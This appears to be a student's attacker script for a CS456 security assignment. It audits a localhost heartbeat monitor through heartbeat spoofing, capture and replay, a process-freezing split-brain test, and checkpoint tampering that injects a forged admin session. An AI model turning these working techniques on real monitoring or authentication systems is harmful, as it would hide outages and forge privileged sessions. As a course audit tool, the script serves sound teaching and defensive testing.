#!/usr/bin/env python3
"""
Attacker file for M1.1 & M1.2
Part 1 Authored by Cameron Hugg (spoof, capture, replay)
Part 2 Extended by Peter Kenoian (split-brain / false failover, checkpoint tamper)
"""

import argparse
import datetime
import json
import os
import platform
import signal
import socket
import subprocess
import sys
import time

# Defaults match the team's monitor (monitor.py binds 127.0.0.1:9999).
DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 9999
DEFAULT_INTERVAL = 1.0          # Send period < W (3.0s) keeps the window alive.
DEFAULT_CAPTURE_PORT = 9998     # Point the service here to capture one real beat.
DEFAULT_CAPTURE_FILE = "captured_beat.bin"
DEFAULT_CHECKPOINT_FILE = "checkpoint.json"
DEFAULT_FREEZE_SECONDS = 4.5    # > W (3.0s) to force monitor failover while primary lives.
SERVICE_NAME = "auth-ticket-daemon"


def ts() -> str:
    """Local timestamp with millisecond precision, matching the monitor's style."""
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]


def log(tag: str, message: str) -> None:
    print(f"[{ts()}] [{tag}] {message}", flush=True)


# ==============================================================================
# PART 1 ATTACKS: Heartbeat Spoofing & Replay (Authored by Cameron Hugg)
# ==============================================================================

def forge_payload(seq: int, service: str) -> bytes:
    """Build a forged HEARTBEAT datagram matching service.py's wire schema."""
    payload = {
        "type": "HEARTBEAT",
        "service": service,
        "seq": seq,
        "timestamp": time.time(),   # Fresh timestamp - but the monitor ignores it.
        "status": "HEALTHY",
    }
    return json.dumps(payload).encode("utf-8")


def attack_spoof(host: str, port: int, interval: float, count: int, service: str) -> None:
    """Part 1 Attack 1: stream forged heartbeats so the monitor reports HEALTHY."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    log("SPOOF", f"Forging HEARTBEAT datagrams -> {host}:{port} every {interval:.2f}s")
    log("SPOOF", "The monitor cannot distinguish these from the real service.")
    seq = 0
    try:
        while count == 0 or seq < count:
            seq += 1
            packet = forge_payload(seq, service)
            sock.sendto(packet, (host, port))
            log("SPOOF", f"sent forged beat seq={seq} status=HEALTHY ({len(packet)} bytes)")
            time.sleep(interval)
    except KeyboardInterrupt:
        log("SPOOF", "stopped by operator.")
    finally:
        sock.close()


def attack_capture(capture_port: int, capture_file: str) -> None:
    """Capture helper: save one genuine heartbeat for later replay.

    Run the critical service pointed at this capture port, e.g.:
        python3 files/service.py --port <capture_port>
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((DEFAULT_HOST, capture_port))
    log("CAPTURE", f"Listening on UDP {DEFAULT_HOST}:{capture_port} for one real heartbeat...")
    log("CAPTURE", f"Point the service here:  python3 files/service.py --port {capture_port}")
    try:
        while True:
            data, addr = sock.recvfrom(4096)
            try:
                payload = json.loads(data.decode("utf-8"))
            except (UnicodeDecodeError, json.JSONDecodeError):
                log("CAPTURE", f"ignored non-JSON packet from {addr[0]}:{addr[1]}")
                continue
            if payload.get("type") != "HEARTBEAT":
                log("CAPTURE", f"ignored non-heartbeat packet from {addr[0]}:{addr[1]}")
                continue
            with open(capture_file, "wb") as f:
                f.write(data)
            log("CAPTURE", f"captured genuine beat seq={payload.get('seq')} "
                           f"timestamp={payload.get('timestamp')} -> saved to {capture_file}")
            log("CAPTURE", "done. Crash the service, then run --attack replay.")
            break
    except KeyboardInterrupt:
        log("CAPTURE", "stopped by operator.")
    finally:
        sock.close()


def attack_replay(host: str, port: int, interval: float, count: int, capture_file: str) -> None:
    """Part 1 Attack 2: replay one captured heartbeat verbatim to mask downtime."""
    try:
        with open(capture_file, "rb") as f:
            packet = f.read()
    except OSError as err:
        log("REPLAY", f"could not read {capture_file}: {err}")
        log("REPLAY", "run '--attack capture' first to record a real beat.")
        sys.exit(1)

    try:
        info = json.loads(packet.decode("utf-8"))
        detail = f"seq={info.get('seq')} timestamp={info.get('timestamp')} (stale)"
    except (UnicodeDecodeError, json.JSONDecodeError):
        detail = f"{len(packet)} raw bytes"

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    log("REPLAY", f"Replaying captured beat [{detail}] -> {host}:{port} every {interval:.2f}s")
    log("REPLAY", "The payload never changes; the monitor never checks freshness.")
    sent = 0
    try:
        while count == 0 or sent < count:
            sock.sendto(packet, (host, port))
            sent += 1
            log("REPLAY", f"replayed stale beat #{sent} ({len(packet)} bytes)")
            time.sleep(interval)
    except KeyboardInterrupt:
        log("REPLAY", "stopped by operator.")
    finally:
        sock.close()


# ==============================================================================
# PART 2 ATTACKS: Failover Split-Brain & Checkpoint Tampering (Peter Kenoian)
# ==============================================================================

def find_service_pids() -> list[tuple[int, str]]:
    """Locate running service.py processes across Linux/macOS/Windows."""
    found = []
    my_pid = os.getpid()
    try:
        if platform.system() == "Windows":
            cmd = [
                "powershell", "-NoProfile", "-Command",
                "Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -match 'service\\.py' } | "
                "Select-Object ProcessId, CommandLine | ConvertTo-Json -Compress"
            ]
            out = subprocess.check_output(cmd, text=True, stderr=subprocess.DEVNULL).strip()
            if out:
                items = json.loads(out)
                if isinstance(items, dict):
                    items = [items]
                for item in items:
                    pid = int(item.get("ProcessId", 0))
                    cmdline = str(item.get("CommandLine", ""))
                    if pid and pid != my_pid:
                        found.append((pid, cmdline))
        else:
            out = subprocess.check_output(["ps", "-eo", "pid,args"], text=True)
            for line in out.splitlines()[1:]:
                parts = line.strip().split(None, 1)
                if len(parts) == 2:
                    pid_str, cmdline = parts
                    if "service.py" in cmdline and "attacker" not in cmdline:
                        pid = int(pid_str)
                        if pid != my_pid:
                            found.append((pid, cmdline))
    except Exception as err:
        log("WARN", f"process lookup warning: {err}")
    return found


def is_pid_alive(pid: int) -> bool:
    """Return True if the OS process with `pid` is currently running."""
    try:
        if platform.system() == "Windows":
            out = subprocess.check_output(
                ["tasklist", "/FI", f"PID eq {pid}"], text=True, stderr=subprocess.DEVNULL
            )
            return str(pid) in out
        os.kill(pid, 0)
        return True
    except Exception:
        return False


def suspend_process(pid: int) -> bool:
    """Pause process execution (kill -STOP on POSIX, NtSuspendProcess on Windows)."""
    if hasattr(signal, "SIGSTOP"):
        os.kill(pid, signal.SIGSTOP)
        return True
    if platform.system() == "Windows":
        import ctypes
        handle = ctypes.windll.kernel32.OpenProcess(0x0800, False, pid)
        if handle:
            res = ctypes.windll.ntdll.NtSuspendProcess(handle)
            ctypes.windll.kernel32.CloseHandle(handle)
            return res == 0
    return False


def resume_process(pid: int) -> bool:
    """Resume paused process execution (kill -CONT on POSIX, NtResumeProcess on Windows)."""
    if hasattr(signal, "SIGCONT"):
        try:
            os.kill(pid, signal.SIGCONT)
            return True
        except ProcessLookupError:
            return False
    if platform.system() == "Windows":
        import ctypes
        handle = ctypes.windll.kernel32.OpenProcess(0x0800, False, pid)
        if handle:
            res = ctypes.windll.ntdll.NtResumeProcess(handle)
            ctypes.windll.kernel32.CloseHandle(handle)
            return res == 0
    return False


def attack_split_brain(target_pid: int | None, freeze_seconds: float) -> None:
    """Part 2 Attack 1 (Induced False Failover / Split-Brain):
    Pause the live primary process for > 3.0s so it stops sending heartbeats
    while remaining alive in memory, then unfreeze it to check whether two
    primaries end up running concurrently (split-brain) or if the monitor
    fenced/killed the old primary PID before promoting the standby.
    """
    procs = find_service_pids()
    if target_pid is None:
        primaries = [p for p in procs if "standby" not in p[1].lower()]
        if primaries:
            target_pid = primaries[0][0]
        elif procs:
            target_pid = procs[0][0]

    if target_pid is None:
        log("SPLIT-BRAIN", "ERROR: no running service.py process found. Start monitor.py and service.py first.")
        sys.exit(1)

    log("SPLIT-BRAIN", f"Located active Primary service.py (PID={target_pid}).")
    log("SPLIT-BRAIN", f"Freezing PID={target_pid} (SIGSTOP) for {freeze_seconds:.1f}s (> W=3.0s timeout)...")

    if not suspend_process(target_pid):
        log("SPLIT-BRAIN", f"ERROR: failed to pause PID={target_pid}. Check permissions.")
        sys.exit(1)

    log("SPLIT-BRAIN", f"Primary PID={target_pid} is FROZEN (heartbeats blocked, process still alive).")
    for sec in range(1, int(freeze_seconds) + 1):
        time.sleep(1.0)
        log("SPLIT-BRAIN", f"paused {sec}.0s / {freeze_seconds:.1f}s ...")
    rem = freeze_seconds - int(freeze_seconds)
    if rem > 0:
        time.sleep(rem)

    log("SPLIT-BRAIN", f"Attempting to resume original Primary (PID={target_pid}) to test for split-brain...")
    if is_pid_alive(target_pid):
        resume_process(target_pid)

    time.sleep(1.0)
    after_procs = find_service_pids()
    old_alive = is_pid_alive(target_pid)

    log("SPLIT-BRAIN", f"Active service.py instances after failover window: {len(after_procs)}")
    for pid, cmd in after_procs:
        log("SPLIT-BRAIN", f"  -> active PID={pid}: {cmd}")

    if old_alive and len(after_procs) > 1:
        log("SPLIT-BRAIN", f"RESULT [VULNERABLE]: Split-Brain occurred! Original Primary (PID={target_pid}) "
                           f"and promoted Standby are both running concurrently.")
    elif not old_alive and len(after_procs) <= 1:
        promoted_info = f"Standby (PID={after_procs[0][0]})" if after_procs else "Standby"
        log("SPLIT-BRAIN", f"RESULT [PROTECTED]: Monitor killed stale Primary (PID={target_pid}) before promoting "
                           f"Standby (PID={after_procs[0][0]}). Split-brain prevented.")
    else:
        log("SPLIT-BRAIN", f"RESULT [INFO]: Original Primary alive={old_alive}, total running={len(after_procs)}.")


def attack_tamper(checkpoint_file: str, tamper_mode: str) -> None:
    """Part 2 Attack 2 (Tampered Checkpoint):
    Either inject a forged admin session into the checkpoint file without updating
    its HMAC/hash ('inject'), or corrupt the checkpoint file bytes ('corrupt')
    before failover to test how the standby node handles it.
    """
    log("TAMPER", f"Targeting checkpoint file: {os.path.abspath(checkpoint_file)} (mode={tamper_mode})")

    if not os.path.exists(checkpoint_file):
        log("TAMPER", f"'{checkpoint_file}' not found; creating baseline checkpoint file to tamper with...")
        sample = {
            "state": {
                "sessions": {"alice": "TKT-legit-session-01"},
                "failed_counts": {"mallory": 3},
                "lockouts": ["mallory"],
            },
            "timestamp": time.time(),
            "hmac": "0" * 64,
        }
        with open(checkpoint_file, "w", encoding="utf-8") as f:
            json.dump(sample, f, indent=2)

    if tamper_mode == "inject":
        try:
            with open(checkpoint_file, "r", encoding="utf-8") as f:
                data = json.load(f)
        except Exception as err:
            log("TAMPER", f"could not parse JSON in {checkpoint_file}: {err}")
            sys.exit(1)

        orig_tag = data.get("hmac") or data.get("hash") or data.get("signature", "<none>")
        log("TAMPER", f"Loaded valid checkpoint (existing integrity tag: {orig_tag})")

        # Support both nested {"state": {...}} and flat dictionary layouts
        state_obj = data.get("state") if isinstance(data.get("state"), dict) else data
        sessions = state_obj.setdefault("sessions", {})
        sessions["fake_admin"] = "TKT-FORGED-ADMIN-9999"

        if isinstance(state_obj.get("lockouts"), list):
            state_obj["lockouts"] = []
        elif isinstance(state_obj.get("lockouts"), dict):
            state_obj["lockouts"].clear()

        with open(checkpoint_file, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)

        log("TAMPER", "Injected fake session 'fake_admin': 'TKT-FORGED-ADMIN-9999' and cleared lockouts "
                      "WITHOUT updating HMAC/hash.")
        log("TAMPER", "Now wait for (or trigger) Primary crash to verify Standby rejects tampered checkpoint.")

    elif tamper_mode == "corrupt":
        with open(checkpoint_file, "w", encoding="utf-8") as f:
            f.write("{CORRUPTED_JSON_CHECKPOINT_DATA: !!!INVALID_HMAC!!!\x00")
        log("TAMPER", f"Corrupted '{checkpoint_file}' with invalid JSON bytes.")
        log("TAMPER", "Now wait for (or trigger) Primary crash to verify Standby refuses or falls back cleanly.")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="CS456 adversarial auditor: Part 1 (spoof/capture/replay) & Part 2 (split-brain/tamper)."
    )
    parser.add_argument(
        "--attack",
        required=True,
        choices=["spoof", "capture", "replay", "split-brain", "tamper"],
        help="which adversarial attack action to run",
    )
    # Part 1 arguments
    parser.add_argument("--host", default=DEFAULT_HOST,
                        help=f"monitor host to attack (default: {DEFAULT_HOST})")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT,
                        help=f"monitor UDP port to attack (default: {DEFAULT_PORT})")
    parser.add_argument("--interval", type=float, default=DEFAULT_INTERVAL,
                        help=f"send period in seconds; keep < W=3.0s (default: {DEFAULT_INTERVAL})")
    parser.add_argument("--count", type=int, default=0,
                        help="number of packets to send, 0 = until interrupted (default: 0)")
    parser.add_argument("--service", default=SERVICE_NAME,
                        help=f"service name to impersonate when spoofing (default: {SERVICE_NAME})")
    parser.add_argument("--capture-port", type=int, default=DEFAULT_CAPTURE_PORT,
                        help=f"port to capture a real beat on (default: {DEFAULT_CAPTURE_PORT})")
    parser.add_argument("--capture-file", default=DEFAULT_CAPTURE_FILE,
                        help=f"file holding the captured beat (default: {DEFAULT_CAPTURE_FILE})")
    # Part 2 arguments
    parser.add_argument("--pid", type=int, default=None,
                        help="Primary service.py PID to freeze for split-brain attack (auto-detected if omitted)")
    parser.add_argument("--freeze-seconds", type=float, default=DEFAULT_FREEZE_SECONDS,
                        help=f"seconds to pause Primary during split-brain attack (default: {DEFAULT_FREEZE_SECONDS})")
    parser.add_argument("--checkpoint", default=DEFAULT_CHECKPOINT_FILE,
                        help=f"checkpoint file path to tamper with (default: {DEFAULT_CHECKPOINT_FILE})")
    parser.add_argument("--tamper-mode", choices=["inject", "corrupt"], default="inject",
                        help="tamper mode: 'inject' fake admin session or 'corrupt' JSON bytes (default: inject)")
    args = parser.parse_args()

    print("=" * 72)
    log("INIT", f"CS456 Adversarial Audit Script (attacker.py) | Mode: {args.attack}")
    print("=" * 72)

    if args.attack == "spoof":
        attack_spoof(args.host, args.port, args.interval, args.count, args.service)
    elif args.attack == "capture":
        attack_capture(args.capture_port, args.capture_file)
    elif args.attack == "replay":
        attack_replay(args.host, args.port, args.interval, args.count, args.capture_file)
    elif args.attack == "split-brain":
        attack_split_brain(args.pid, args.freeze_seconds)
    elif args.attack == "tamper":
        attack_tamper(args.checkpoint, args.tamper_mode)


if __name__ == "__main__":
    main()
